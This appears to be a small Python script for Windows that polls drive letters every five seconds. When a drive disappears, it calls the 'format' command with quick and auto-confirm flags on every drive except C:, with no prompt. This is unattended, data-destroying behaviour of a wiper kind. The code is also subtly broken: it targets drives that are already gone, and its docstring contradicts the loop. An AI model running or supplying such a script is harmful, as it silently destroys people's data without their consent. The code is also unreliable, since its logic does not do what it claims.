import os
import time
import subprocess

def list_drives():
    """Return a list of available drives on Windows (excluding system drives)."""
    drives = []
    for drive in range(ord('C'), ord('Z') + 1):
        drive_letter = chr(drive) + ':'
        if os.path.exists(drive_letter):
            drives.append(drive_letter)
    return drives

def format_drive(drive_letter):
    """Format the given drive."""
    print(f"Formatting drive {drive_letter}...")
    try:
        # Run the Windows 'format' command to format the drive
        subprocess.run(['format', drive_letter, '/FS:NTFS', '/Q', '/Y'], check=True)
        print(f"Drive {drive_letter} formatted successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to format {drive_letter}: {e}")

def main():
    previous_drives = set(list_drives())
    while True:
        current_drives = set(list_drives())
        if previous_drives != current_drives:
            removed_drives = previous_drives - current_drives
            added_drives = current_drives - previous_drives
            
            # If a drive is removed, we try to format it (if it's not the system drive)
            for drive in removed_drives:
                if drive != 'C:':  # Avoid formatting system drive
                    format_drive(drive)

            previous_drives = current_drives
        
        time.sleep(5)  # Check every 5 seconds

if __name__ == '__main__':
    main()
